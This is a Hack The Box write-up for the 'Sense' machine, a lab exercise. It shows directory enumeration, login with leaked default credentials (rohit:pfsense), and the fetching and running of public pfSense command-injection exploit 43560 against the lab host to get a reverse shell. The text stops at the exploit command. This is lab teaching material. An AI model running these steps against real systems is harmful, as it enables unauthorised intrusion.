# Machine Synopsis

Sense, while not requiring many steps to complete, can be challenging for some as the proof of concept exploit that is publicly available is very unreliable. An alternate method using the same vulnerability is required to successfully gain access. ([Source](https://www.hackthebox.com/machines/sense))

It seems like there is a website, let’s check it out!

Trying the default credentials `admin:pfsense` did not work :(

Let’s run a `dirsearch` then!

>   Note: was stuck here for awhile because the important file was hidden in a `txt` file

```bash
┌──(root㉿shiro)-[/home/shiro]

```

It seems like there were some interesting `txt` files called `changelog.txt` and `system-users.txt`!

![changelog](https://github.com/blankshiro/blankshiro.github.io/blob/main/assets/img/HackTheBox/Sense/changelog.png?raw=true)

It seems to say that there are 2 of 3 vulnerabilities that were patched.

![system_users](https://github.com/blankshiro/blankshiro.github.io/blob/main/assets/img/HackTheBox/Sense/system_users.png?raw=true)

We got some credentials to work on! Let’s try logging in!

>   Note: it turns out the credentials were actually `rohit:pfsense` instead of `Rohit:company defaults`

![logged_in](https://github.com/blankshiro/blankshiro.github.io/blob/main/assets/img/HackTheBox/Sense/logged_in.png?raw=true)

The most important information here is probably the version number, so let’s do some research :D

# Exploitation

After some Google searches, I found that the version has a command injection vulnerability listed on [ExploitDB](https://www.exploit-db.com/exploits/43560).

Let’s grab the script using `searchsploit`, start a netcat listener and exploit!

```bash
┌──(root㉿shiro)-[/home/shiro/HackTheBox/Sense]
└─# searchsploit -m 43560

┌──(root㉿shiro)-[/home/shiro/HackTheBox/Sense]
└─# python3 43560.py --rhost 10.10.10.60 --lhost 10.10.14.3 --lport 1234 --username rohit --password pfsense
